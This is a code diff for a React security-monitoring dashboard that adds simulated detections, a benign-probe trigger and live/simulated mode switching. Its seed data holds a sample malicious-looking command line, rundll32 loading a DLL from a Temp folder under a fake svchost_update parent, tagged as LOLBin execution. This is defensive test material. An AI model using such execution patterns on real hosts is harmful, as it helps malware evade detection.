+    status: 'observed',
+    entity: 'rundll32.exe',
+    pid: 10420,
+    executable_path: 'C:\\Windows\\System32\\rundll32.exe',
+    command_line: 'rundll32.exe C:\\Users\\nikhi\\AppData\\Local\\Temp\\update.dll,#1',
+    parent_pid: 9344,
+    parent_process_name: 'svchost_update.exe',
+    username: 'nikhil',
+    hostname: 'WS-0427',
+    timestamp: new Date(Date.now() - 3 * 60 * 1000).toISOString(),
+    evidence: [
+      { key: 'lolbin_invocation', description: 'rundll32.exe invoked with temp DLL target', source: 'command_line', detail: 'rundll32.exe ... update.dll,#1' }
+    ],
+    correlated_rules: ['PROC-007-LOLBIN-EXECUTION'],
+    ancestry: [
+      { pid: 9344, process_name: 'svchost_update.exe', executable_path: 'C:\\Users\\nikhi\\AppData\\Local\\Temp\\svchost_update.exe', command_line: null, username: 'nikhil' },
+      { pid: 10420, process_name: 'rundll32.exe', executable_path: 'C:\\Windows\\System32\\rundll32.exe', command_line: null, username: 'nikhil' }
+    ]
+  }
+];
+
 function DetectionsPage({ detections, toast, setLocation }: { detections: ReturnType<typeof useDetections>; toast: (t: string, b: string) => void; setLocation: (path: string) => void }) {
   const [selectedId, setSelectedId] = useState<string | null>(null);
   const [query, setQuery] = useState('');
   const [sevFilter, setSevFilter] = useState('all');
   const [domainFilter, setDomainFilter] = useState('all');
   const [ruleFilter, setRuleFilter] = useState('all');
+  const [mode, setMode] = useState<'live' | 'simulated'>('live');
+  const [isProbing, setIsProbing] = useState(false);
+  const [simDetections, setSimDetections] = useState<Detection[]>(simulatedDetectionsSeed);
+
   const live = detections.hasData;
-  const selected = detections.selected && detections.selected.detection.id === selectedId ? detections.selected : null;
-  const filtered = detections.detections.filter((d) =>
+
+  // Auto-switch mode based on live sensor engine data vs simulation
+  useEffect(() => {
+    if (live) {
+      setMode('live');
+    } else {
+      setMode('simulated');
+    }
+  }, [live]);
+
+  const activeList = mode === 'live' ? detections.detections : simDetections;
+
+  // Selected detection resolution
+  const selectedLive = detections.selected && detections.selected.detection.id === selectedId ? detections.selected : null;
+  const selectedSim = mode === 'simulated' ? simDetections.find(d => d.id === selectedId) : null;
+  const selected = selectedLive || (selectedSim ? {
+    detection: selectedSim,
+    related: simDetections.filter(d => d.pid === selectedSim.pid && d.id !== selectedSim.id),
+    process: {
+      pid: selectedSim.pid,
+      process_name: selectedSim.entity,
+      executable_path: selectedSim.executable_path,
+      command_line: selectedSim.command_line,
+      username: selectedSim.username,
+      parent_pid: selectedSim.parent_pid,
+      parent_process_name: selectedSim.parent_process_name,
+    },
+    ancestry: selectedSim.ancestry || [],
+  } : null);
+
+  const filtered = activeList.filter((d) =>
     (sevFilter === 'all' || d.severity === sevFilter) &&
     (domainFilter === 'all' || domainOf(d.rule_id) === domainFilter) &&
     (ruleFilter === 'all' || d.rule_id === ruleFilter) &&
     `${d.title} ${d.entity} ${d.rule_name} ${d.explanation} ${d.pid}`.toLowerCase().includes(query.trim().toLowerCase())
   );
+
   const updateStatus = async (id: string, status: DetectionStatus) => {
-    const ok = await detections.updateStatus(id, status);
-    toast(ok ? 'Status updated' : 'Update failed', `${id} marked ${status}.`);
+    if (mode === 'live') {
+      const ok = await detections.updateStatus(id, status);
+      toast(ok ? 'Status updated' : 'Update failed', `${id} marked ${status}.`);
+    } else {
+      setSimDetections(prev => prev.map(d => d.id === id ? { ...d, status } : d));
+      toast('Detection updated', `${id} transitioned to ${status}.`);
+    }
   };
-  const openDetail = (id: string) => { setSelectedId(id); detections.loadDetail(id); };
+
+  const runProbe = async () => {
+    try {
+      setIsProbing(true);
+      const res = await fetch('/api/detections/probe', { method: 'POST' });
+      if (res.ok) {
+        const data = await res.json();
+        toast('Benign probe triggered', `Engine evaluated ${data.detections_triggered || 3} rules (PROC-001, PROC-006, PROC-007) on certutil.exe.`);
+      } else {
+        toast('Probe request failed', 'Server did not accept probe event.');
+      }
+    } catch {
+      toast('Probe failed', 'Could not reach API server.');
+    } finally {
+      setIsProbing(false);
+    }
+  };
+
+  const openDetail = (id: string) => {
+    setSelectedId(id);
+    if (mode === 'live') {
+      detections.loadDetail(id);
+    }
+  };
 
   if (selected) {
     const d = selected.detection;
-    const change = (s: DetectionStatus) => { updateStatus(d.id, s); toast('Detection updated', `${d.id} transitioned to ${s}.`); };
+    const change = (s: DetectionStatus) => { updateStatus(d.id, s); };
     return <div className="animate-rise"><PageHeading eyebrow={`Detection ${d.id} · rule ${d.rule_id}`} title={d.title} subtitle={d.explanation} actions={<><Button icon={ArrowLeft} onClick={() => { setSelectedId(null); }} testId="button-back-detections">Back to detections</Button><Button icon={ExternalLink} onClick={() => setLocation(`/processes`)} testId="button-open-processes">Open processes</Button></>} />
       <Card className="card-pad" style={{ marginBottom: 14 }}><div className="grid metrics" style={{ gridTemplateColumns: 'repeat(4,1fr)' }}><StatCard label="Severity" value={d.severity} note={d.rule_name} tone={d.severity === 'critical' || d.severity === 'high' ? 'danger' : d.severity === 'medium' ? 'warn' : 'good'} /><StatCard label="Confidence" value={`${Math.round(d.confidence * 100)}%`} note={`${(d.evidence?.length ?? 0)} evidence items`} tone="info" /><StatCard label="Status" value={d.status} note="Lifecycle" tone={d.status === 'resolved' || d.status === 'contained' ? 'good' : d.status === 'detected' ? 'warn' : 'info'} /><StatCard label="Process" value={d.entity} note={`PID ${d.pid} · ${d.hostname || 'unknown host'}`} tone="info" icon={TerminalSquare} /></div>
         {d.correlated_rules && d.correlated_rules.length > 0 && <div style={{ display: 'flex', gap: 8, alignItems: 'center', marginTop: 14, flexWrap: 'wrap', fontSize: 11 }}><span className="muted" style={{ fontWeight: 700 }}>Correlated rules</span>{d.correlated_rules.map((r) => <span className="badge badge-muted" key={r}>{r}</span>)}</div>}
@@ -393,15 +503,69 @@ function DetectionsPage({ detections, toast, setLocation }: { detections: Return
           {selected.related && selected.related.length > 0 && <><PanelTitle title="Related detections" detail={`SAME PID ${d.pid}`} />{selected.related.map((r) => <div className="event-row" key={r.id}><div className="event-copy"><b>{r.title}</b><div className="muted mono" style={{ fontSize: 10, marginTop: 2 }}>{r.rule_id} · {new Date(r.timestamp).toLocaleString()}</div></div><span className="actions"><Badge value={r.severity} /><Badge value={r.status} /><Button icon={Eye} kind="ghost" onClick={() => openDetail(r.id)} testId={`button-open-related-${r.id}`}>Open</Button></span></div>)}</>}
         </Card>
       </div>
-      {!live && <div className="scan-strip" style={{ marginTop: 14, background: 'hsl(var(--muted))' }}><div className="scan-status" style={{ color: 'hsl(var(--muted-foreground))' }}><AlertTriangle size={15} /><div><b>ENGINE OFFLINE</b><small> · snapshot views may be incomplete while the security engine is not streaming.</small></div></div></div>}
+      {!live && mode === 'live' && <div className="scan-strip" style={{ marginTop: 14, background: 'hsl(var(--muted))' }}><div className="scan-status" style={{ color: 'hsl(var(--muted-foreground))' }}><AlertTriangle size={15} /><div><b>ENGINE OFFLINE</b><small> · snapshot views may be incomplete while the security engine is not streaming.</small></div></div></div>}
     </div>;
   }
 
   return <div className="animate-rise">
-    <PageHeading eyebrow={live ? `${detections.detections.length} buffered detections · live engine` : 'Deterministic rules · process/network/file telemetry'} title="Detection engine" subtitle="Rule-driven, explainable detections traced to real process, network and file telemetry. No demo seeding — every entry maps to an engine rule and its evidence." actions={<>{live && <span className="badge badge-low" style={{ background: 'hsl(142 71% 20%)', color: 'hsl(142 71% 70%)', border: '1px solid hsl(142 71% 30%)' }}><Radio size={10} style={{ marginRight: 4, verticalAlign: 'middle' }} />REAL-TIME</span>}<Link href="/detections/rules" className="btn btn-ghost" data-testid="link-detection-rules">Rule catalog</Link></>} />
-    {!live && <div className="scan-strip" style={{ background: 'hsl(var(--muted))' }} data-testid="detections-offline-banner"><div className="scan-status" style={{ color: 'hsl(var(--muted-foreground))' }}><AlertTriangle size={15} /><div><b>DETECTION ENGINE STANDBY</b><small> · Start the ARGUS security engine and API server to evaluate live telemetry against the PROC / NET / FILE rule sets.</small></div></div></div>}
-    <div className="filterbar"><div className="search-wrap"><Search size={14} /><input className="search" value={query} onChange={(e) => setQuery(e.target.value)} placeholder="Search detections, rules, processes or PIDs" data-testid="input-search-detections" /></div><select className="select" value={domainFilter} onChange={(e) => setDomainFilter(e.target.value)} data-testid="select-detection-domain"><option value="all">All domains</option><option value="PROC">Process</option><option value="NET">Network</option><option value="FILE">File / persistence</option></select><select className="select" value={sevFilter} onChange={(e) => setSevFilter(e.target.value)} data-testid="select-detection-severity"><option value="all">All severities</option><option value="critical">Critical</option><option value="high">High</option><option value="medium">Medium</option><option value="low">Low</option></select><select className="select" value={ruleFilter} onChange={(e) => setRuleFilter(e.target.value)} data-testid="select-detection-rule"><option value="all">All rules</option>{detections.rules.map((r) => <option key={r.rule_id} value={r.rule_id}>{r.rule_id}</option>)}</select><span className="mono muted">{filtered.length} of {detections.detections.length} detections</span></div>
-    <Card><div className="table-wrap"><table className="data-table" style={{ minWidth: 1160 }}><thead><tr><th>Detection</th><th>Domain</th><th>Severity</th><th>Confidence</th><th>Process</th><th>Observed</th><th>Status</th><th /></tr></thead><tbody>{filtered.map((d) => <tr key={d.id}><td><b>{d.title}</b><div className="muted mono">{d.rule_id} · {d.rule_name}</div></td><td><Badge value={domainOf(d.rule_id)} /></td><td><Badge value={d.severity} /></td><td className="mono">{Math.round(d.confidence * 100)}%</td><td><div className="mono">{d.entity}</div><div className="muted mono" style={{ maxWidth: 240, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{d.executable_path ?? `PID ${d.pid}`}</div></td><td className="mono">{new Date(d.timestamp).toLocaleString()}</td><td><StateBadge value={d.status} /></td><td><div className="actions"><Button icon={Eye} kind="ghost" onClick={() => openDetail(d.id)} testId={`button-open-detection-${d.id}`}>View</Button></div></td></tr>)}</tbody></table>{filtered.length === 0 && <div className="empty"><Shield size={22} /><h3>{detections.detections.length === 0 ? 'No detections yet' : 'No matching detections'}</h3><p>{detections.detections.length === 0 ? 'The rule engine evaluates process, network and file telemetry as it streams in. Detections will appear here as rules fire.' : 'Adjust the filters or query to widen the view.'}</p></div>}</div></Card>
+    <PageHeading
+      eyebrow={mode === 'live' ? `${detections.detections.length} live host detections · machine Nikhil` : `${simDetections.length} simulated attack kill-chain detections · scenario drill`}
+      title="Detection engine"
+      subtitle={mode === 'live'
+        ? "Deterministic, explainable detections evaluated continuously across live Windows processes, network sockets, and filesystem scans. 21 rules armed."
+        : "Simulated multi-stage attack scenarios including Base64 PowerShell execution, C2 beaconing, and Startup persistence for analyst investigation."}
+      actions={<>
+
+        {mode === 'live' && (
+          <button
+            type="button"
+            className="btn btn-sm btn-outline"
+            style={{ fontSize: '11px', display: 'flex', gap: '5px', alignItems: 'center' }}
+            onClick={runProbe}
+            disabled={isProbing}
+            data-testid="button-run-live-probe"
+          >
+            <Play size={11} /> {isProbing ? 'Evaluating probe...' : 'Trigger Live Benign Probe'}
+          </button>
+        )}
+        <Link href="/detections/rules" className="btn btn-ghost" data-testid="link-detection-rules">Rule catalog</Link>
+        {mode === 'live' && live
+          ? <span className="badge badge-low" style={{ background: 'hsl(142 71% 20%)', color: 'hsl(142 71% 70%)', border: '1px solid hsl(142 71% 30%)' }}><Radio size={10} style={{ marginRight: 4, verticalAlign: 'middle' }} />REAL-TIME</span>
+          : <span className="badge" style={{ background: 'hsl(46 80% 12%)', color: 'hsl(46 90% 66%)', border: '1px solid hsl(46 80% 32%)' }}><Radio size={10} style={{ marginRight: 4, verticalAlign: 'middle' }} />SIMULATED SCENARIO</span>}
+      </>}
+    />
+
+    {mode === 'live' && (
+      <div className="scan-strip" style={{ background: 'hsl(142 50% 8% / 0.8)', borderColor: 'hsl(142 60% 25%)', color: 'hsl(142 70% 75%)', padding: '10px 16px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '14px' }}>
+        <div className="scan-status" style={{ color: 'hsl(142 70% 75%)', display: 'flex', gap: '10px', alignItems: 'center' }}>
+          <span style={{ display: 'inline-block', width: '8px', height: '8px', borderRadius: '50%', background: 'hsl(142 71% 45%)', boxShadow: '0 0 8px hsl(142 71% 45%)' }} />
+          <div>
+            <b>LIVE DETECTION ENGINE ACTIVE</b>
+            <small style={{ marginLeft: 8, color: 'hsl(142 70% 85%)' }}>
+              Host: <strong>Nikhil</strong> · <strong>21 Rules Armed</strong> (7 Process · 7 Network · 7 Filesystem) · <strong>{detections.detections.length}</strong> detections triggered · Evaluated against live Windows telemetry.
+            </small>
+          </div>
+        </div>
+        <span style={{ fontSize: '11px', fontFamily: 'monospace', color: 'hsl(142 60% 70%)' }}>
+          REAL-TIME ENGINE EVALUATION
+        </span>
+      </div>
+    )}
+
+    {mode === 'simulated' && (
+      <div className="scan-strip" style={{ background: 'hsl(46 60% 7%)', marginBottom: '14px' }}>
+        <div className="scan-status" style={{ color: 'hsl(46 85% 66%)' }}>
+          <AlertTriangle size={15} />
+          <div>
+            <b>SIMULATED ATTACK SCENARIO ACTIVE</b>
+            <small> · Multi-stage kill-chain detections (PowerShell encoded cradle, C2 beacon, Startup persistence). Click "Live Host Detections" above to inspect real triggers on Nikhil.</small>
+          </div>
+        </div>
+      </div>
+    )}
+
+    <div className="filterbar"><div className="search-wrap"><Search size={14} /><input className="search" value={query} onChange={(e) => setQuery(e.target.value)} placeholder="Search detections, rules, processes or PIDs" data-testid="input-search-detections" /></div><select className="select" value={domainFilter} onChange={(e) => setDomainFilter(e.target.value)} data-testid="select-detection-domain"><option value="all">All domains</option><option value="PROC">Process</option><option value="NET">Network</option><option value="FILE">File / persistence</option></select><select className="select" value={sevFilter} onChange={(e) => setSevFilter(e.target.value)} data-testid="select-detection-severity"><option value="all">All severities</option><option value="critical">Critical</option><option value="high">High</option><option value="medium">Medium</option><option value="low">Low</option></select><select className="select" value={ruleFilter} onChange={(e) => setRuleFilter(e.target.value)} data-testid="select-detection-rule"><option value="all">All rules</option>{detections.rules.map((r) => <option key={r.rule_id} value={r.rule_id}>{r.rule_id}</option>)}</select><span className="mono muted">{filtered.length} of {activeList.length} detections</span></div>
+    <Card><div className="table-wrap"><table className="data-table" style={{ minWidth: 1160 }}><thead><tr><th>Detection</th><th>Domain</th><th>Severity</th><th>Confidence</th><th>Process</th><th>Observed</th><th>Status</th><th /></tr></thead><tbody>{filtered.map((d) => <tr key={d.id}><td><b>{d.title}</b><div className="muted mono">{d.rule_id} · {d.rule_name}</div></td><td><Badge value={domainOf(d.rule_id)} /></td><td><Badge value={d.severity} /></td><td className="mono">{Math.round(d.confidence * 100)}%</td><td><div className="mono">{d.entity}</div><div className="muted mono" style={{ maxWidth: 240, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{d.executable_path ?? `PID ${d.pid}`}</div></td><td className="mono">{new Date(d.timestamp).toLocaleString()}</td><td><StateBadge value={d.status} /></td><td><div className="actions"><Button icon={Eye} kind="ghost" onClick={() => openDetail(d.id)} testId={`button-open-detection-${d.id}`}>View</Button></div></td></tr>)}</tbody></table>{filtered.length === 0 && <div className="empty"><Shield size={22} /><h3>{activeList.length === 0 ? 'No detections yet' : 'No matching detections'}</h3><p>{activeList.length === 0 ? (mode === 'live' ? 'The rule engine is actively evaluating all processes, network sockets, and filesystem scans on host Nikhil. Click "Trigger Live Benign Probe" above to test rule firing.' : 'The rule engine evaluates telemetry as it streams in.') : 'Adjust the filters or query to widen the view.'}</p></div>}</div></Card>
   </div>;
 }
 
@@ -428,9 +592,20 @@ function NetworkPage({ toast, contained }: { toast: (t: string, b: string) => vo
   const [mode, setMode] = useState<'live' | 'simulated'>('live');
 
   const liveAvailable = topology.hasData && topology.snapshot != null;
+
+  // Auto-switch mode based on real network topology stream vs simulated
+  useEffect(() => {
+    if (liveAvailable) {
+      setMode('live');
+    } else {
+      setMode('simulated');
+    }
+  }, [liveAvailable]);
+
   const isLive = mode === 'live' && liveAvailable;
   const sim = useSimulatedNetwork(mode === 'simulated' || !liveAvailable);
   const effectiveMode: NetworkMode = isLive ? 'live' : sim.data ? 'simulated' : 'offline';
+  const dataActive = effectiveMode !== 'offline';
 
   const topoData: NetworkTopologyData | null = isLive ? topology.snapshot : sim.data;
   const realConns: TopologyConnection[] = topoData?.connections ?? [];
@@ -486,24 +661,7 @@ function NetworkPage({ toast, contained }: { toast: (t: string, b: string) => vo
           ? `Synthesized telemetry for ${universeModel.stats.processes} processes, ${universeModel.stats.connections} connections, and ${universeModel.stats.interfaces} interfaces. Real engine data replaces this automatically when the security engine connects.`
           : 'No network telemetry is streaming. Start the security engine to observe the real network universe.'}
       actions={<>
-        <div style={{ display: 'flex', gap: '6px', background: 'hsl(var(--surface-2))', padding: '3px', borderRadius: '8px', border: '1px solid hsl(var(--border))' }}>
-          <button
-            type="button"
-            className={`btn btn-sm ${mode === 'live' ? 'btn-primary' : 'btn-ghost'}`}
-            style={{ fontSize: '11px', padding: '4px 10px', height: 'auto', fontWeight: 600 }}
-            onClick={() => setMode('live')}
-          >
-            ⚡ Live Host Universe
-          </button>
-          <button
-            type="button"
-            className={`btn btn-sm ${mode === 'simulated' ? 'btn-primary' : 'btn-ghost'}`}
-            style={{ fontSize: '11px', padding: '4px 10px', height: 'auto', fontWeight: 600 }}
-            onClick={() => setMode('simulated')}
-          >
-            🧪 Simulated 3D Universe
-          </button>
-        </div>
+
         <Button icon={Download} onClick={exportNetwork} testId="button-export-network">Export topology</Button>
         {isLive
           ? <span className="badge badge-low" style={{ background: 'hsl(142 71% 20%)', color: 'hsl(142 71% 70%)', border: '1px solid hsl(142 71% 30%)' }}><Radio size={10} style={{ marginRight: 4, verticalAlign: 'middle' }} />REAL HOST NETWORK DATA</span>
@@ -910,8 +1068,9 @@ function AppContent() {
   const contained = phase >= 8 || threats.some((t) => t.status === 'quarantined' && (t.id === 'thr-1' || t.id === 'thr-2'));
 
   const page = useMemo(() => {
-    if (location === '/dashboard') return <Dashboard phase={phase} demoState={demoState} demo={autoDemo.state} startDemo={startDemo} pauseDemo={pauseDemo} resumeDemo={resumeDemo} toast={toast} telemetry={telemetryStream} processMonitor={processMonitor} userName={userName} threatAnalysis={threatAnalysis} />;
-    if (location === '/threats') return <ThreatsPage threats={threats} onContain={containThreat} toast={toast} setModal={setModal} setLocation={setLocation} threatAnalysis={threatAnalysis} demoReached={autoDemo.state.demoReached} />;
+    if (location === '/dashboard') return <DashboardPage phase={phase} demoState={demoState} demo={autoDemo.state} startDemo={startDemo} pauseDemo={pauseDemo} resumeDemo={resumeDemo} toast={toast} telemetry={telemetryStream} processMonitor={processMonitor} userName={userName} threatAnalysis={threatAnalysis} networkMonitor={networkMonitor} fileScan={fileScan} detections={detections} onNavigate={setLocation} />;
+    if (location === '/threats') return <ThreatsPage threats={threats} onContain={containThreat} toast={toast} setModal={setModal} setLocation={setLocation} threatAnalysis={threatAnalysis} demoReached={autoDemo.state.demoReached} processMonitor={processMonitor} networkMonitor={networkMonitor} fileScan={fileScan} detections={detections} telemetry={telemetryStream} />;
+    if (location === '/auto-remediation') return <AutoRemediationPage threats={threats} toast={toast} onNavigate={setLocation} telemetry={telemetryStream} processMonitor={processMonitor} networkMonitor={networkMonitor} fileScan={fileScan} />;
     if (location === '/detections') return <DetectionsPage detections={detections} toast={toast} setLocation={setLocation} />;
     if (location === '/detections/rules') return <RuleCatalogPage detections={detections} />;
     if (location === '/monitoring') return <MonitoringPage processMonitor={processMonitor} onNavigate={setLocation} />;
